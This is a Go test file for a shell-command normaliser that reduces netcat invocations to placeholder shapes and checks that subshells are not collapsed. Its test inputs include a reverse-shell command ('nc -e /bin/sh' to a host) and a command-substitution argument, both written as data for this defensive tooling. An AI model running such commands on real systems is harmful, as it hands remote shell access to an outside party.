package shellshape

import "testing"

func TestNc(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		// Basic usage
		{"connect", "nc host.example.com 80", "nc <host> N"},
		{"listen", "nc -l 1234", "nc -l N"},
		{"verbose scan", "nc -v -z host.example.com 20-30", "nc -v -z <host> N"},
		{"listen keep-alive", "nc -l -k 8080", "nc -l -k N"},

		// Flags with arguments
		{"source port", "nc -p 12345 host.example.com 80", "nc -p N <host> N"},
		{"timeout", "nc -w 5 host.example.com 443", "nc -w N <host> N"},
		{"source addr", "nc -s 10.0.0.1 host.example.com 80", "nc -s <val> <host> N"},
		{"proxy", "nc -X connect -x proxy:8080 host.example.com 443", "nc -X <val> -x <val> <host> N"},
		{"interval", "nc -i 2 host.example.com 80", "nc -i N <host> N"},
		{"exec", "nc -e /bin/sh host.example.com 80", "nc -e <path> <host> N"},
		{"bound interface", "nc -b en0 host.example.com 80", "nc -b <val> <host> N"},

		// Boolean flags
		{"udp verbose", "nc -u -v host.example.com 5000", "nc -u -v <host> N"},
		{"no dns ipv4", "nc -n -4 192.168.1.1 22", "nc -n -4 <host> N"},
		{"ipv6", "nc -6 ::1 80", "nc -6 <host> N"},

		// Aliases
		{"netcat alias", "netcat host.example.com 80", "netcat <host> N"},
		{"ncat alias", "ncat -l 8080", "ncat -l N"},

		// Redirects
		{"redirect in", "nc host.example.com 80 < input.txt", "nc <host> N < <path>"},
		{"redirect out", "nc -l 8080 > output.txt", "nc -l N > <path>"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := Normalize(tt.input)
			if got != tt.want {
				t.Errorf("Normalize(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}

	// Collision tests
	t.Run("different hosts collide", func(t *testing.T) {
		a := Normalize("nc google.com 443")
		b := Normalize("nc example.org 443")
		if a != b {
			t.Errorf("expected %q == %q", a, b)
		}
	})

	t.Run("different ports collide", func(t *testing.T) {
		a := Normalize("nc host.example.com 80")
		b := Normalize("nc host.example.com 8080")
		if a != b {
			t.Errorf("expected %q == %q", a, b)
		}
	})

	// Subshell safety test
	t.Run("subshell not collapsed", func(t *testing.T) {
		benign := Normalize("nc host.example.com 80")
		subshell := Normalize("nc $(dangerous-command) 80")
		if benign == subshell {
			t.Error("subshell must produce different shape than literal")
		}
	})
}
